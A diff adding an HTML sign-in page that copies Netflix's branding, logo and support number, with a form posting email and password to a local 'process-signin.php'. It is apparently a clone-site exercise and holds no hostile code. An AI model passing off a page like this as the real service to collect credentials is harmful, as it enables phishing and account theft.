@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Sign In</title>
+    <link rel="stylesheet" href="signin.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <a href="index.html">
+                <img src="580b57fcd9996e24bc43c529.webp" alt="Netflix">
+            </a>
+        </div>
+    </header>
+
+    <main>
+        <div class="sign-in-container">
+            <div class="form-wrapper">
+                <h1>Sign In</h1>
+                <form action="process-signin.php" method="POST">
+                    <div class="form-group">
+                        <input type="email" name="email" id="email" required>
+                        <label for="email">Email or phone number</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" name="password" id="password" required>
+                        <label for="password">Password</label>
+                    </div>
+                    <div class="error-message" id="error-message"></div>
+                    <button type="submit" class="signin-button">Sign In</button>
+                    <div class="form-help">
+                        <div class="remember">
+                            <input type="checkbox" id="remember" name="remember">
+                            <label for="remember">Remember me</label>
+                        </div>
+                        <a href="#" class="help-link">Need help?</a>
+                    </div>
+                </form>
+                <div class="other-options">
+                    <div class="signup-now">
+                        New to Netflix? <a href="signup.html">Sign up now</a>
+                    </div>
+                    <div class="recaptcha-terms">
+                        This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+                        <a href="#">Learn more.</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-top">
+                <p>Questions? Call <a href="tel:000-800-919-1694">000-800-919-1694</a></p>
+            </div>
+            <div class="footer-links">
+                <a href="#">FAQ</a>
+                <a href="#">Help Centre</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Privacy</a>
+                <a href="#">Cookie Preferences</a>
+                <a href="#">Corporate Information</a>
+            </div>
+            <div class="language-selector">
+                <select>
+                    <option value="en">English</option>
+                    <option value="hi">हिन्दी</option>
+                </select>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Auto-fill email from URL parameter and show error if present
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const error = urlParams.get('error');
+            
+            if (email) {
+                const emailInput = document.getElementById('email');
+                emailInput.value = email;
+                emailInput.classList.add('has-value');
+            }
+            
+            if (error) {
+                const errorDiv = document.getElementById('error-message');
+                errorDiv.textContent = decodeURIComponent(error);
+                errorDiv.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
